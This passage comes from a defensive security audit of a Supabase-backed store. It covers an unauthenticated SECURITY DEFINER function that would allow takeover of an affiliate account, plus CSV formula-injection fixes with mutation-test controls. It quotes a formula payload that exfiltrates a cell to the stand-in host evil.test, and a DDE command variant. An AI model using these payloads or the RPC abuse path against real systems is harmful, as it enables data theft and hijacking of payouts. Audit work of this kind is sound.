| P3 | `contentType` back from the client | 1 failed |
| P4 | Drop the size cap from the helper | 1 failed |
| P5 | Accept any `RIFF` as WEBP (drop the brand check) | 1 failed |
| P6 | Accept any `ftyp` as AVIF (drop the brand check) | 1 failed |
| P7 | Drop the minimum-length guard | **24 passed — NOT CAUGHT** |

**P7 exposed a gap in my own test.** The "too short" cases (`[0x89,0x50]`,
empty) return null with or without the guard, so they never exercised it. The
input that does is a 4-byte `GIF8` — a complete GIF signature in fewer than 12
bytes, which without the guard classifies as a real image. Added, plus a
3-byte JPEG prefix; P7 re-run and now **1 failed** — caught.

---

## I-06 — the product-image route advertises GIF and the bucket rejects it

**Grade:** `DATABASE-PROVEN` · **Severity:** P3 · **Status:** OPEN — needs a
product decision, not a patch

`POST /api/admin/upload-image` accepts `image/gif` (`route.ts:8`) and
`ensureProductImageBucket` creates the bucket with
`allowedMimeTypes: ["image/png", "image/jpeg", "image/webp", "image/avif"]`
(`admin-products.ts:1045-1049`) — no GIF. Production confirms the live bucket
carries exactly those four.

So a GIF has always been accepted by the route and then rejected by storage,
surfacing as the route's generic `"Upload failed."` 500. After the I-05 fix the
same thing happens one step later: the sniff correctly returns `image/gif` and
Supabase refuses the content type.

Both ways of fixing it are one line, and which one is right is not a security
question:

- **Drop `image/gif` from the route's allow-list** — matches what the system
  actually does, and tells the operator honestly at the point of upload.
- **Add `image/gif` to the bucket** — a production storage change, so Rule 4
  applies.

**`OWNER DECISION NEEDED:`** should the store accept animated GIFs as product
imagery? Left unchanged rather than guessed at.

---

## I-07 — `create_partner_invite` is an unauthenticated, RLS-bypassing write into the affiliate money tables, reachable by anyone with the public anon key

**Grade:** `DATABASE-PROVEN` · **Severity:** **P0** · **Status:** OPEN —
revoke written and ready, **blocked on the owner (Rule 4)**

Found by asking Supabase's own security advisor rather than by reading source,
which is why nothing in the source-level passes caught it: **the function does
not exist in this repository.**

### What it is

```
public.create_partner_invite(p_id uuid, p_auth_user_id uuid, p_name text,
                             p_email text, p_referral_code text,
                             p_commission_percent numeric, p_created_by uuid)
```

| property | value |
|---|---|
| `prosecdef` (SECURITY DEFINER) | **true** |
| owner | `postgres` |
| `has_function_privilege('anon', …, 'EXECUTE')` | **true** |
| `has_function_privilege('authenticated', …, 'EXECUTE')` | **true** |
| authorization check inside the body | **none** |

`SECURITY DEFINER` + owner `postgres` means it runs with the owner's rights and
**bypasses RLS** on `partners` and `ambassadors`. PostgREST publishes every
`public` function at `/rest/v1/rpc/<name>`, and
`NEXT_PUBLIC_SUPABASE_ANON_KEY` ships to every browser that loads the site.

I read the whole body. It never calls `auth.uid()`, `auth.jwt()`, or anything
else that would identify the caller. Every parameter — including
`p_commission_percent`, `p_referral_code` and `p_created_by` — is taken on
trust from whoever calls it.

The RLS sweep this codebase is proud of (`rls-enforce-all-tables.sql`) does not
help. RLS on `partners` and `ambassadors` is enabled and correct; this function
is *defined to bypass it*.

### Two paths through the body

**Branch 3 — create.** Inserts a matched `partners` + `ambassadors` pair with
attacker-chosen `id`, `name`, `email`, `referral_code` and
`commission_percent`. Status is hard-coded `'pending'`, so accrual and payout
(gated on approved status) do not follow immediately. What does follow:
unbounded row injection into the affiliate roster, and **referral-code
squatting** — registering the codes a real campaign would want, since
`referral_code` is unique.

**Branch 2 — claim, and this is the severe one.** If a row exists in
`ambassadors` matching `lower(email) = lower(p_email)`, the function checks only:

```sql
if pre_added.auth_user_id is not null
   and pre_added.auth_user_id is distinct from p_auth_user_id then
  raise exception 'ambassador % is already claimed by another account', p_email;
end if;
```

The guard fires **only when `auth_user_id` is already set**. When it is NULL —
which is exactly the state of an ambassador an admin has pre-added and who has
not yet signed up — an anonymous caller supplying that email and their own
`p_auth_user_id` gets:

```sql
update public.ambassadors set auth_user_id = p_auth_user_id, ...
```

plus an upsert of the `partners` twin. The victim's **referral code, commission
percent, approved status and payout fields are preserved and rebound to the
attacker's auth user.** That is account takeover of an affiliate's earnings
stream, by anyone who can guess an email address.

`p_created_by` is attacker-supplied too, so the audit attribution on the
resulting rows is forgeable.

### Live exposure, measured

```sql
select (select count(*) from public.ambassadors) as ambassadors_total,
       (select count(*) from public.ambassadors where auth_user_id is null) as unclaimed,
       (select count(*) from public.ambassadors where auth_user_id is null and status='approved') as unclaimed_approved,
       (select count(*) from public.partners where auth_user_id is null) as partners_unclaimed;
```

| ambassadors_total | unclaimed | unclaimed_approved | partners_unclaimed |
|---|---|---|---|
| 7 | **0** | **0** | **0** |

**Branch 2 is not exploitable at this instant** — every ambassador is claimed.
Branch 3 is exploitable right now by anyone.

That zero is a snapshot, not a control. The window opens the moment an admin
pre-adds an ambassador by email, which is a first-class supported workflow —
the function's own comment calls it *"Pre-added by an admin under this email"*
and `F-002` in the ledger discusses exactly that flow. Every future onboarding
re-opens it, and the window stays open until that person signs up.

I did **not** test any of this against production. No RPC was called, no row
written. The evidence is the function definition, the privilege catalogue and
row counts — all reads.

### Why no source pass would have found it

`grep -rn "create_partner_invite"` across the entire repository returns
**nothing**: not in `src/`, not in `src/lib/sql/`, not in `docs/`. The
application's partner-creation RPC is `create_partner_application`, a different
function. So this is **orphaned live-database drift** — a function that exists
only in production, that no checked-in migration creates, and that no code
calls.

That also makes it safe to revoke: nothing can break, because nothing uses it.

### The full anon-reachable SECURITY DEFINER surface

Enumerated rather than sampled — every `SECURITY DEFINER` function in `public`
with EXECUTE for `anon` or `authenticated`:

| function | verdict |
|---|---|
| `create_partner_invite` | **the defect above** |
| `validate_referral_code` | **correct, leave alone.** `STABLE` (read-only), filtered to `status = 'approved'`, returns only what the storefront needs to apply a typed-in referral discount. Referral codes are meant to be shared publicly and the storefront cannot validate one without an anonymous path. |

Two functions, one defect. No others are reachable.

### Fix — written, deliberately NOT applied

`website/src/lib/sql/revoke-anon-create-partner-invite.sql`:

```sql
revoke execute on function public.create_partner_invite(
  uuid, uuid, text, text, text, numeric, uuid
) from anon, authenticated, public;
```

Server-side callers are unaffected either way — the service-role key bypasses
grants entirely.

**`OWNER DECISION NEEDED:` this is the most urgent item in Block I.** Applying
it is a production DDL change, which Rule 4 reserves to the owner. Recommended
order:

1. Run the revoke (zero application risk — nothing calls the function).
2. Then decide whether to `drop function` outright. Revoke is reversible and
   sufficient; the drop is the tidy-up.
3. Separately, audit `partners` / `ambassadors` for rows this could already
   have created. `created_by`, unexpected `referral_code` values and rows with
   no matching application are the tells. Current counts (7 and 7, fully
   converged per `F-002`) suggest nothing has been injected, but that is
   inference, not proof.

**CROSS-BLOCK:** `partners` / `ambassadors` are Block A+B's tables. This is
filed here because it is a missing-authorization defect on an internet-reachable
endpoint (Phase 12), not an affiliate-logic defect — but A+B should know the
write path exists, and consolidation should make sure only one block acts on it.

### Also from the advisor, recorded not fixed

- **Leaked-password protection is disabled** in Supabase Auth (customer
  accounts). One toggle; the owner's call. P3.
- **`current_auth_role`, `current_auth_uid`, `current_auth_email` have a mutable
  `search_path`** (WARN). These three back the RLS policies including
  `admin_audit_logs_admin_only` from I-01. Low risk here because exploiting a
  mutable `search_path` needs the ability to create objects in a schema earlier
  in the path, which `anon` does not have — but they are one-line fixes
  (`set search_path = public, pg_temp`) and they are load-bearing for RLS. P3.
- **35 tables have RLS enabled with no policy** (INFO). That is
  deny-by-default and is exactly what `rls-enforce-all-tables.sql` intends —
  **not a defect**, recorded so nobody re-files it from the advisor output.

---

## I-08 — Four of eight CSV escapers let an anonymous stranger put a live formula in the owner's spreadsheet

**Grade:** `BEHAVIORAL-TEST-PROVEN` · **Severity:** P1 · **Status:** FIXED

### The divergence

Eight separate CSV cell escapers exist. Four neutralise spreadsheet formula
injection; four only quote.

| escaper | formula guard |
|---|---|
| `api/admin/orders/export/route.ts:7` `csvEscape` | ✅ |
| `lib/admin-customers.ts:160` `csvEscape` | ✅ |
| `lib/admin-membership.ts:697` `csvEscape` | ✅ |
| `lib/inventory-ledger.ts:180` `csvCell` | ✅ (and already exported) |
| `api/admin/partners/export-payouts/route.ts:6` `escapeCsv` | ❌ |
| `api/admin/partners/export-payout-history/route.ts:6` `escapeCsv` | ❌ |
| `api/admin/tax/export/route.ts:6` `csvEscape` | ❌ |
| `lib/admin-products-csv.ts:24` `csvEscape` | ❌ |

The guarded four state the reason (`admin-customers.ts:162-164`):

> *"Neutralize spreadsheet formula injection from attacker-controlled cells
> (customer name/email) — a leading `= + - @` / tab / CR would run as a formula
> in Excel/Sheets. Prefix a single quote."*

So the hazard is understood here. It just was not applied everywhere — the same
shape as I-03 (three IP resolvers) and I-05 (three image sniffers). This is the
third instance of one correct implementation and several weaker copies, and it
is the pattern worth naming for the final report.

### Why quoting is not the defence

The unguarded four wrap every value in double quotes:

```ts
function escapeCsv(value: string) {
  return `"${value.replace(/"/g, '""')}"`;
}
```

Quoting fixes **delimiter** injection — a comma or newline breaking the row
apart. Formula injection is a different bug: Excel and Sheets strip the
surrounding quotes while parsing the field and *then* evaluate a leading `=`.
The two look similar and only one is fixed by quoting.

### Why the partner exports are the serious pair

`export-payouts` writes `row.name`, `row.email` and `row.referralCode`;
`export-payout-history` writes `row.ambassadorName` and the note.

A partner's name, email and referral code come from the **public ambassador
application form**. They are unauthenticated, externally supplied text. So the
path is:

1. A stranger submits an application with the name
   `=HYPERLINK("http://evil.test/?d="&A1,"You won")`. No account needed.
2. The owner exports payouts — a routine, recurring task — and opens the CSV in
   Excel.
3. The formula runs with the owner's spreadsheet privileges, on a sheet holding
   every ambassador's commissions and payout handles. `HYPERLINK` exfiltrates a
   neighbouring cell to an external host on one click; `=cmd|'/c calc'!A1` is
   the DDE variant.

`tax/export` and `admin-products-csv` carry operator-supplied text, so they are
lower risk — fixed at the same time because the guard costs nothing and leaving
two of eight unguarded just re-creates the divergence.

### Fix applied

New `src/lib/csv-safe.ts` exports `csvSafeCell`, adopted by all four unguarded
sites. Their local escapers are deleted, so eight implementations become five,
and the four that were already correct are unchanged.

`csvSafeCell` is **byte-for-byte identical** to the four that already got this
right — a test asserts that against a reference implementation across a sample
of inputs — so adopting it changes no existing export's output. The guard is
applied *before* the quoting decision, so the apostrophe lands inside the
quotes where the spreadsheet will see it.

### Reproduction and verification

`src/lib/csv-formula-injection.test.ts` drives the **real** export handlers with
a hostile partner name and asserts on the CSV text, using an
`injectableCells()` helper that models what a spreadsheet does: strip the
optional surrounding quotes, then check whether the cell still begins with a
formula character.

Before — red for the right reason, live formula cells in both exports:

```
× export-payouts neutralises a hostile partner name and referral code
× export-payout-history neutralises a hostile ambassador name and note
    AssertionError: expected [ …(2) ] to deeply equal []
   Tests  2 failed | 1 passed (3)
```

After: **15 passed (15)**. Full suite **210 files / 3643 tests passed**, 1 file
/ 7 skipped, zero regressions. `tsc --noEmit` clean, eslint clean.

### Negative controls

| # | Mutation | Result |
|---|---|---|
| C1 | Drop the formula guard (back to quoting only) | 11 failed |
| C2 | Guard only `=`, miss `+ - @` tab CR | 8 failed |
| C3 | Apply the guard *after* quoting (apostrophe outside the quotes) | 1 failed |
| C4 | Stop escaping embedded quotes | 3 failed |

**C3 is worth a note on method.** On the first run it reported 15/15 passed —
apparently uncaught. It was not: my mutation script's string replacement had
silently failed to match, so nothing was mutated and the suite passed on the
unmodified fix. Re-applied with an assertion that the anchor exists, C3 is
caught (1 failed, the "quotes AND guards when a cell needs both" case).

**A mutation that fails to apply is indistinguishable from a mutation that is
not caught, and it reads as the reassuring one.** Every negative control in this
block that reported "not caught" (I-01's M4, I-05's P7) was re-checked for this;
both were genuine gaps and both were closed. Worth carrying into Block E, whose
whole job is mutation testing.

**CROSS-BLOCK:** `lib/inventory-ledger.ts` (Block D) and
`lib/admin-customers.ts` / `lib/admin-membership.ts` still hold their own
correct copies. Collapsing those into `csvSafeCell` is a tidy-up for
consolidation, not a defect — they are not wrong, only duplicated.

---

## Status

| Id | Severity | Evidence | Fixed |
|---|---|---|---|
| I-01 | P0 | `DATABASE-PROVEN` + `BEHAVIORAL-TEST-PROVEN` | **Read boundary fixed & tested.** Rotation + historical rows still owed to the owner |
| I-02 | P3 today / P1 if enabled | `DATABASE-PROVEN` | No — **corrected**; latent, owner decision before the switch is flipped |
| I-03 | P1 | `BEHAVIORAL-TEST-PROVEN` | **Fixed & tested** (incl. I-03b, found by the test) |
| I-04 | P3 (down from P2) | `BEHAVIORAL-TEST-PROVEN` | **Corrected & fixed** — rate limit added; "leak" half withdrawn |
| I-05 | **P1** (raised) | `BEHAVIORAL-TEST-PROVEN` + `DATABASE-PROVEN` | **Fixed & tested** |
| I-05b | — | `SOURCE-INSPECTED` | **PASS** — customer-facing proof upload already correct |
| I-06 | P3 | `DATABASE-PROVEN` | No — owner decision (accept GIFs or not) |
| **I-07** | **P0** | `DATABASE-PROVEN` | **No — revoke written, blocked on owner (Rule 4)** |
| I-08 | P1 | `BEHAVIORAL-TEST-PROVEN` | **Fixed & tested** |

I-01, I-03, I-04 and I-05 are proven and fixed, each with negative controls
recorded above. I-02 is corrected and recorded as a latent risk with no code
change, for the reasons given there. I-06 needs a product decision.

**Two of my own findings were overstated and are corrected in place** — I-02
(a grep that missed `canView*`) and I-04 (a "leak" that the confirmation page
already exposes by design). Both corrections are kept in the record rather than
quietly rewritten, because a reader needs to know which claims were checked
hard enough to break.

Full suite after I-08: **210 files / 3643 tests passed**, 1 file / 7 tests
skipped, zero regressions. `tsc --noEmit` clean, eslint clean.

**CROSS-BLOCK:** `src/app/api/catalog/back-in-stock/route.ts` sits under
`api/catalog/`. Block D owns `catalog.ts` (the library), not this route, so the
edit was made here; flagging it in case D touches the same file.
